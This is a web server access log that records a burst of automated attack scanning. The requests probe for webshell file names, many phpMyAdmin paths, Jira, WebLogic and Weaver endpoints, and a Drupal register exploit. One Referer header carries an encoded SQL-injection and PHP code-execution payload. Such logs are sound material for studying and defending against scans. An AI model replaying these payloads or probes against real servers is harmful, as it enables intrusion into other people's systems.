- - [08/Jul/2020:06:50:17 +0000] "GET /mjx.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:17 +0000] "GET /xiaoxia.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:18 +0000] "GET /yuyang.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:19 +0000] "GET /zz.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:39 +0000] "GET /no1.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:43 +0000] "GET /woshimengmei.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:44 +0000] "GET /indea.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:47 +0000] "GET /taisui.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:48 +0000] "GET /xiaxia.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:51 +0000] "GET /kk.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:52 +0000] "GET /xsser.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:53 +0000] "GET /zzz.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:55 +0000] "GET /dp.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:59 +0000] "GET /1ts.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:51:00 +0000] "GET /haiyan.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:51:01 +0000] "GET /phpdm.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:51:04 +0000] "GET /5678.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:51:05 +0000] "GET /root11.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:51:07 +0000] "GET /xiu.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:51:08 +0000] "POST /wuwu11.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:09 +0000] "POST /xw.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:11 +0000] "POST /9678.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:16 +0000] "POST /xx.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:16 +0000] "POST /xx.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:17 +0000] "POST /s.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:18 +0000] "POST /w.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:31 +0000] "POST /qq.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:35 +0000] "POST /hhh.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:39 +0000] "POST /vvv.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:41 +0000] "POST /www.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:43 +0000] "POST /ffr.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:44 +0000] "POST /411.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:45 +0000] "POST /415.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:45 +0000] "POST /421.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:46 +0000] "POST /444.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:47 +0000] "POST /a411.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:48 +0000] "POST /whoami.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:49 +0000] "POST /whoami.php.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:49 +0000] "POST /9.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:53 +0000] "POST /98k.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:51:59 +0000] "POST /887.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:52:00 +0000] "POST /888.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:52:03 +0000] "POST /aa.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:52:04 +0000] "POST /bb.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:52:05 +0000] "POST /pp.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:52:07 +0000] "POST /bbq.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:52:08 +0000] "POST /jj1.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:52:09 +0000] "POST /jbb.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [08/Jul/2020:06:52:12 +0000] "GET /%73%65%65%79%6F%6E/%68%74%6D%6C%6F%66%66%69%63%65%73%65%72%76%6C%65%74 HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [08/Jul/2020:06:52:13 +0000] "GET /secure/ContactAdministrators!default.jspa HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [08/Jul/2020:06:52:14 +0000] "GET /weaver/bsh.servlet.BshServlet HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [08/Jul/2020:06:52:16 +0000] "GET /console/login/LoginForm.jsp HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [08/Jul/2020:06:52:16 +0000] "POST /index.php HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
- - [08/Jul/2020:06:52:19 +0000] "POST /%75%73%65%72/%72%65%67%69%73%74%65%72?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%64%72%75%70%61%6c%5f%61%6a%61%78 HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
- - [08/Jul/2020:06:52:28 +0000] "GET / HTTP/1.1" 200 2443 "-" - "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
- - [08/Jul/2020:06:52:29 +0000] "GET /joomla/ HTTP/1.1" 404 1871 "-" - "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
- - [08/Jul/2020:06:52:31 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:141:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" - "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [08/Jul/2020:06:52:32 +0000] "GET /index.php HTTP/1.1" 200 2443 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:33 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 1871 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:35 +0000] "GET /phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:36 +0000] "GET /pmd/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:37 +0000] "GET /pma/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:39 +0000] "GET /PMA2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:40 +0000] "GET /pmamy/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:41 +0000] "GET /pmamy2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:43 +0000] "GET /admin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:47 +0000] "GET /dbadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:49 +0000] "GET /web/phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:51 +0000] "GET /admin/pma/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:52 +0000] "GET /admin/PMA/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:52 +0000] "GET /admin/mysql/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:53 +0000] "GET /admin/mysql2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:54 +0000] "GET /admin/phpmyadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:55 +0000] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:56 +0000] "GET /mysqladmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:52:57 +0000] "GET /mysql-admin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:03 +0000] "GET /phpadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:03 +0000] "GET /phpAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:04 +0000] "GET /phpmyadmin0/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:05 +0000] "GET /phpmyadmin1/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:05 +0000] "GET /phpmyadmin2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:06 +0000] "GET /phpMyAdmin-4.4.0/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:07 +0000] "GET /phpMyAdmin4.8.0/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:09 +0000] "GET /phpMyAdmin4.8.1/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:10 +0000] "GET /phpMyAdmin4.8.2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:11 +0000] "GET /phpMyAdmin4.8.4/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:12 +0000] "GET /phpMyAdmin4.8.5/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:13 +0000] "GET /myadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:13 +0000] "GET /myadmin2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:14 +0000] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:15 +0000] "GET /phpMyadmin_bak/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:16 +0000] "GET /www/phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:17 +0000] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:17 +0000] "GET /phpmyadmin-old/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:18 +0000] "GET /phpMyAdminold/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:19 +0000] "GET /phpMyAdmin.old/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:31 +0000] "GET /phpma/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:32 +0000] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:35 +0000] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:36 +0000] "GET /phpMyAbmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:37 +0000] "GET /phpMyAdmin__/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:39 +0000] "GET /v/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:40 +0000] "GET /phpmyadm1n/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:41 +0000] "GET /phpMyAdm1n/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:43 +0000] "GET /phpMyadmi/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:44 +0000] "GET /phpMyAdmion/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:46 +0000] "GET /s/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:47 +0000] "GET /phpMyAdmin1/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:51 +0000] "GET /pwd/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:52 +0000] "GET /phpMyAdmina/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:53 +0000] "GET /phpMydmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:53 +0000] "GET /phpMyAdmins/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:53:55 +0000] "GET /phpMyAdmin._/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:11 +0000] "GET /phpmyadmin3333/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:12 +0000] "GET /php2MyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:15 +0000] "GET /phpiMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:16 +0000] "GET /phpNyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:19 +0000] "GET /1/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:20 +0000] "GET /download/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:21 +0000] "GET /phpMyAdmin_111/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:23 +0000] "GET /321/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:24 +0000] "GET /123131/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:25 +0000] "GET /phpMyAdminn/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:27 +0000] "GET /sbb/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:28 +0000] "GET /WWW/phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:29 +0000] "GET /phpMyAdmln/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:29 +0000] "GET /phpMyAdmin_ai/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:30 +0000] "GET /__phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:31 +0000] "GET /program/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:32 +0000] "GET /shopdb/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:33 +0000] "GET /phppma/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:33 +0000] "GET /phpmy/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
- - [08/Jul/2020:06:54:34 +0000] "GET /mysql/admin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
